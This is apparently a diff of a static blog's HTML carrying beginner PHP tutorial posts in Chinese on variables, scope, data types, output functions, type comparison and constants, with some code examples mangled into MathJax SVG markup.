-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">function add(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.877ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 808 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">a,</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
- <use xlink:href="#E1-MJMAIN-2C" x="529" y="0"></use>
-</g>
-</svg>b)<br>&#123;<br>	<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="8.152ex" height="2.009ex" style="vertical-align: -0.338ex;" viewBox="0 -719.6 3509.8 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">count=</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6F" x="433" y="0"></use>
- <use xlink:href="#E1-MJMATHI-75" x="919" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6E" x="1491" y="0"></use>
- <use xlink:href="#E1-MJMATHI-74" x="2092" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3D" x="2731" y="0"></use>
-</g>
-</svg>a+$b;<br>	return $count;<br>&#125;<br>&#x2F;&#x2F;计算两个数的和<br>function count_score()<br>&#123;<br>	$m&#x3D;96;&#x2F;&#x2F;数学成绩<br>	$y&#x3D;99;&#x2F;&#x2F;英语成绩<br>	<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.125ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 5220.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">sum=add(</title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-73" x="0" y="0"></use>
- <use xlink:href="#E1-MJMATHI-75" x="469" y="0"></use>
- <use xlink:href="#E1-MJMATHI-6D" x="1042" y="0"></use>
- <use xlink:href="#E1-MJMAIN-3D" x="2198" y="0"></use>
- <use xlink:href="#E1-MJMATHI-61" x="3254" y="0"></use>
- <use xlink:href="#E1-MJMATHI-64" x="3784" y="0"></use>
- <use xlink:href="#E1-MJMATHI-64" x="4307" y="0"></use>
- <use xlink:href="#E1-MJMAIN-28" x="4831" y="0"></use>
-</g>
-</svg>m, $y);<br>	echo &quot;小明的总成绩是&quot; . $sum;<br>&#125;<br>count_score();<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210307210752947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/">
+            PHP入门学习阶段（二）
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0(%E4%B8%80)/">PHP入门学习阶段（一）</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:01.924Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="一、常量"><a href="#一、常量" class="headerlink" title="一、常量"></a>一、常量</h1><p>PHP 变量规则：</p>
-<ul>
-<li>变量以 $ 符号开始，后面跟着变量的名称</li>
-<li>变量名必须以字母或者下划线字符开始</li>
-<li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li>
-<li>变量名不能包含空格</li>
-<li>变量名是区分大小写的（<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="3.322ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 1430.4 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">y 和 </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-</defs>
-<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
- <use xlink:href="#E1-MJMATHI-79" x="0" y="0"></use>
-<g transform="translate(497,0)">
-<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">和</text>
-</g>
-</g>
-</svg>Y 是两个不同的变量）</li>
-</ul>
-<p>变量是用于存储信息的”容器”：<br><img  src="https://img-blog.csdnimg.cn/20210227110903845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>以上x,y,z均属于变量<br><strong>注释：当您赋一个文本值给变量时，请在文本值两侧加上引号。</strong><br><img  src="https://img-blog.csdnimg.cn/20210227111418680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>变量的作用分为局部变量以及全局变量</strong><br>变量的作用域是脚本中变量可被引用/使用的部分。</p>
-<p>PHP 有四种不同的变量作用域：</p>
-<ul>
-<li>local</li>
-<li>global</li>
-<li>static</li>
-<li>parameter</li>
-</ul>
-<p><strong>local</strong><br>是局部变量，仅能在函数内部访问。</p>
-<p><img  src="https://img-blog.csdnimg.cn/20210227114324961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到，函数内部是可以输出的但对于全局来说是无法访问的<br> <strong>global</strong> </p>
-<p>用于函数内访问全局变量。<br>在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字或者使用 $GLOBALS[index] 数组：<br><img  src="https://img-blog.csdnimg.cn/20210227112610201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210227113706999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>Static</strong><br>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候您希望某个局部变量不要被删除。</p>
-<p>要做到这一点，请在您第一次声明变量时使用 static 关键字：<br><img  src="https://img-blog.csdnimg.cn/20210227113104139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>使用<code>static</code>保留函数内部的 X值，便于依次运算。</p>
-<h1 id="二、数据类型"><a href="#二、数据类型" class="headerlink" title="二、数据类型"></a>二、数据类型</h1><p>PHP中主要又一下几种数据类型：</p>
-<ol>
-<li>String（字符串）</li>
-<li>Integer（整型）</li>
-<li>Float（浮点型）</li>
-<li>Boolean（布尔型）</li>
-<li> Array（数组）</li>
-<li>Object（对象）</li>
-<li>NULL（空值）</li>
-</ol>
-<p><strong>一.String</strong><br>一个字符串是一串字符的序列,你可以将任何文本放在单引号和双引号中.<br>上述我们已经讲过：这里再演示一遍<br><img  src="https://img-blog.csdnimg.cn/20210227155756330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>二.Integer</strong></p>
-<p>整数是一个没有小数的数字。<br>整数规则:</p>
-<p>整数必须至少有一个数字 (0-9)<br>整数不能包含逗号或空格<br>整数是没有小数点的<br>整数可以是正数或负数<br>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。<br><strong>PHP var_dump() 函数返回变量的数据类型和值：</strong><br><img  src="https://img-blog.csdnimg.cn/20210227160254563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>三.Float</strong><br>浮点数是带小数部分的数字，或是指数形式。<br><img  src="https://img-blog.csdnimg.cn/20210227160611254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>四.布尔型</strong><br>布尔型可以是 TRUE 或 FALSE。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$x&#x3D;true;<br>$y&#x3D;false;<br></code></pre></td></tr></table></figure>
-<p>常用于条件判断</p>
-<p><strong>五.数组</strong><br>数组可以在一个变量中存储多个值。<br><img  src="https://img-blog.csdnimg.cn/20210227161205618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>六.对象</strong><br>对象数据类型也可以用于存储数据。<br>在 PHP 中，对象必须声明。<br>首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。<br>这个有点不太明白，我用文本实例向大家说明：<br><img  src="https://img-blog.csdnimg.cn/20210227161947909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>相比对于新手来说<br><strong>echo，print，print_r，var_dump 的区别</strong>也像我一样疑惑，这里向大家解释一下：<br>1.echo</p>
-<p>输出一个或者多个字符串。</p>
-<p>2.print</p>
-<p>和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1。</p>
-<p>3.print_r</p>
-<p>打印关于变量的易于理解的信息,如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。 记住，print_r() 将把数组的指针移到最后边。使用 reset() 可让指针回到开始处。</p>
-<p>4.var_dump</p>
-<p>此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
-<p>5.var_dump 和 print_r 的区别</p>
-<p>var_dump 返回表达式的类型与值而 print_r 仅返回结果，相比调试代码使用 var_dump 更便于阅读。</p>
-<p><strong>七.NULL 值</strong><br>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p>
-<p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p>
-<p>可以通过设置变量值为 NULL 来清空变量数据：<br><img  src="https://img-blog.csdnimg.cn/20210227162408453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到回复值为：NULL即为空值</p>
-<h1 id="三-类型比较"><a href="#三-类型比较" class="headerlink" title="三.类型比较"></a>三.类型比较</h1><p>虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。</p>
-<ul>
-<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>
-<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>
-</ul>
-<p>在这里：<code>42是一个整形数字</code>而<code>“42”</code>是一个字符串<br><img  src="https://img-blog.csdnimg.cn/2021022716323948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>得到结果：说明松散和严格两种结果<br>这里简述一下，如果需要学习更多种类型的比较标准可以去PHP官网进行学习或者去<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-types-comparisons.html">点击这里也可以进行学习</a></p>
-<h1 id="四-常量"><a href="#四-常量" class="headerlink" title="四.常量"></a>四.常量</h1><p>常量是一个简单值的标识符。该值在脚本中不能改变。</p>
-<p>一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 **(常量名不需要加 $ 修饰符，不然会报错的！！！)**。</p>
-<p><strong>注意： 常量在整个脚本中都可以使用。</strong></p>
-<p><strong>设置常量</strong><br>使用 define() 函数，函数语法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">bool define ( string <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="13.254ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 5706.7 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">name , mixed </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-69" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path>
